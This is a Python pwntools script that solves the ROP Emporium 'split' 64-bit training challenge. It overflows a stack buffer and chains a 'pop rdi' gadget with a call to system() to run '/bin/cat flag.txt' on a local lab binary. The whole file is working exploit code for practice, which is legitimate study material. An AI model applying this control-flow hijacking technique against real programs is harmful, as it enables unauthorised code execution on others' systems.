#!/usr/bin/env python3
from pwn import *

"""
Solution for ROP Emporium level 2: split (64 bit)
"""

"""
cat flag: 0x601060 '/bin/cat flag.txt'
call system: 0x000000000040074b <+9>:     call   0x400560 <system@plt>
pop rdi, ret: 0x00000000004007c3: pop rdi; ret;

1. Fill the buffer with 40 bytes of junk
3. Fill RDI with "cat flag" address
3. Address of cat flag
2. Address of call system
"""

context.log_level = "debug"
io = process("./split")

offset = 40

io.recvuntil(b"> ")

payload = b""
payload += b"A" * offset
payload += p64(0x00000000004007c3)      # pop rdi; ret;
payload += p64(0x601060)      # /bin/cat flag.txt
payload += p64(0x000000000040074b)      # call system()

print(str(payload))

io.sendline(payload)
io.recvuntil(b"Thank you!\n")
flag = io.recv()
success(str(flag))
